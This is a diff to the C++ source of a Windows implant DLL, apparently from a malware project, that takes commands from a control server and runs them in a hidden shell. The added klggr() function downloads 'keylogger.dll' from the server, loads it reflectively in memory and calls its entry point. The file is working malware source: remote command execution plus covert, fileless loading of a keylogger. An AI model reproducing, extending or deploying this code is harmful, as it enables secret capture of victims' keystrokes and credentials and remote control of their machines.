@@ -1,5 +1,6 @@
-//cl /EHsc /LD .\target_code.cpp /link User32.lib
-//#define WIN32_LEAN_AND_MEAN
+//cl /EHsc /LD .\target_code.cpp
+#define WIN32_LEAN_AND_MEAN
+#define DEBUG 0
 #include <iostream>
 #include <Windows.h>
 #include <string>
@@ -8,22 +9,12 @@
 #include <vector>
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-typedef int (*SendDataFunc)(const std::string&, const std::string&);
-typedef std::string (*RecvDataFunc)(const std::string&);
-typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
-
-SendDataFunc send_data;
-RecvDataFunc receive_data;
-RecvDataRawFunc receive_data_raw;
-
-// LPCWSTR dllPath = L"C:\\malware\\Dependencies\\Networking\\network_lib.dll";
-// HINSTANCE hDLL;
-///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
 HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
 bool connected = false;
 bool outerloop = true; bool loop = true;
+
 
 typedef struct INIT_PARAMS
 {
@@ -32,7 +23,10 @@ typedef struct INIT_PARAMS
     void* (*FindExportAddress)(HMODULE, const char*);
     void* (*MemoryLoadLibrary)(const void *, size_t);
     void (*MemoryFreeLibrary)(void*);
+    void* (*MemoryGetBaseAddress)(void*);
 }INIT_PARAMS;
+INIT_PARAMS sKey_l;
+INIT_PARAMS* pStruct = nullptr;
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -40,14 +34,29 @@ bool ExecuteCommand(const std::string& command);
 void give_command(const std::string &command);
 bool rev_shell();
 int main_thing();
+int klggr();
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+typedef int (*SendDataFunc)(const std::string&, const std::string&);
+typedef std::string (*RecvDataFunc)(const std::string&);
+typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
+SendDataFunc send_data;
+RecvDataFunc receive_data;
+RecvDataRawFunc receive_data_raw;
+
+typedef int (*target_init_KL)(INIT_PARAMS* params);
+target_init_KL Target_initialization_KL = nullptr;
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
 __declspec(dllexport) int target_init(INIT_PARAMS* params)
 {
-    receive_data_raw = (RecvDataRawFunc)params->FindExportAddress(reinterpret_cast<HMODULE>(params->base_address), "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
-    receive_data = (RecvDataFunc)params->FindExportAddress(reinterpret_cast<HMODULE>(params->base_address), "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
-    send_data = (SendDataFunc)params->FindExportAddress(reinterpret_cast<HMODULE>(params->base_address), "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
+    pStruct = params;
+
+    receive_data_raw = (RecvDataRawFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
+    receive_data = (RecvDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
+    send_data = (SendDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
 
     if (!receive_data || !send_data || !receive_data_raw)
     {
@@ -109,7 +118,10 @@ int main_thing()
                         {
                             std::string payload_keylogger = (receive_data("from_server.txt").substr(1));
                             std::cout << "Recieved after waiting ->" << payload_keylogger << std::endl;
-                            ExecuteCommand(payload_keylogger);
+                            // ExecuteCommand(payload_keylogger);
+
+                            klggr();
+
                         }
                         
                         send_data("from_server.txt","`");
@@ -194,6 +206,71 @@ void give_command(const std::string &command)
     DWORD bytesWritten;
     if (!WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL)) std::cerr << "WriteFile failed with error code: " << GetLastError() << std::endl;
     FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
+}
+
+int klggr()
+{
+
+    if(!Target_initialization_KL)
+    {
+        #if DEBUG
+        MessageBoxA(NULL,"In if", "In if", MB_ICONHAND);
+        #endif
+
+        void* vpKey_lib = nullptr;
+        std::vector<unsigned char> vKey_lib;
+        vKey_lib = receive_data_raw("keylogger.dll");
+
+        vpKey_lib = pStruct->MemoryLoadLibrary(vKey_lib.data(), vKey_lib.size());
+        if(vpKey_lib == nullptr)
+        {
+            #if DEBUG
+            std::cerr << "Failed to load DLL from memory.\n";
+            #endif
+
+            return 0;
+        }
+
+        #if DEBUG
+        MessageBoxA(NULL,"Downloaded n loaded", "Downloaded n loaded", MB_ICONHAND);
+        #endif
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        void* BaseAddressKl = pStruct->MemoryGetBaseAddress(vpKey_lib);
+
+        #if DEBUG
+        char buffer[64];
+        sprintf(buffer, "BaseAddressKl: 0x%p", BaseAddressKl);
+        MessageBoxA(NULL, buffer, "Debug Info", MB_ICONINFORMATION);
+        #endif
+
+        Target_initialization_KL = (target_init_KL)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddressKl),"?target_init_KL@@YAHPEAUINIT_PARAMS@@@Z");
+        if (!Target_initialization_KL)
+        {
+            #if DEBUG
+            std::cerr << "Failed to get Target_initialization_KL() address "<< GetLastError() << std::endl;
+            #endif
+
+            #if DEBUG
+            MessageBoxA(NULL,"HUH?", "HUH?", MB_ICONHAND);
+            #endif
+
+            pStruct->MemoryFreeLibrary(vpKey_lib);
+            return 0;
+        }
+
+        #if DEBUG
+        MessageBoxA(NULL,"Got Entry point", "Got Entry point", MB_ICONHAND);
+        #endif
+
+    }
+
+    #if DEBUG
+    std::cout << "Calling Keyloggr" << std::endl; MessageBoxA(NULL,"Calling Keyloggr", "Calling Keyloggr", MB_ICONHAND);
+    #endif
+
+    Target_initialization_KL(pStruct);
+    return 1;
 }
 
 bool rev_shell()
